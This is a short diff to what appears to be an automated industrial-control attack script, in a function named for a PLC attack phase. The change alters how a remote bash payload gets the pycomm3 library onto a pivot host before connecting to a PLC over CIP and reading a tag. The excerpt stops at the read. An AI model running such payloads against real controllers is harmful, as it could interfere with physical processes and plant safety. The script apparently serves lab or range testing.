@@ -1071,10 +1071,12 @@ def phase5_plc_attack() -> PhaseResult:
     # Route: Kali -SSH-> Historian -SSH hop-> IDS -CIP/44818-> PLC
     payload = (
         "bash -c '"
-        "source ~/attack_script/venv/bin/activate 2>/dev/null || "
-        "source ~/venv/bin/activate 2>/dev/null || "
-        "source ~/main/venv/bin/activate 2>/dev/null || true; "
+        "python3 -m pip install --user pycomm3 --break-system-packages >/dev/null 2>&1 "
+        "|| python3 -m pip install --user pycomm3 >/dev/null 2>&1; "
         f"python3 - <<'\"'\"'PYEOF'\"'\"'\n"
+        f"import sys, os\n"
+        f"sys.path.append(os.path.expanduser(\"~/.local/lib/python3.11/site-packages\"))\n"
+        f"sys.path.append(os.path.expanduser(\"~/.local/lib/python3.12/site-packages\"))\n"
         f"from pycomm3 import LogixDriver\n"
         f"with LogixDriver(\"{plc_ip}\") as plc:\n"
         f"    cur = plc.read(\"{tag}\")\n"
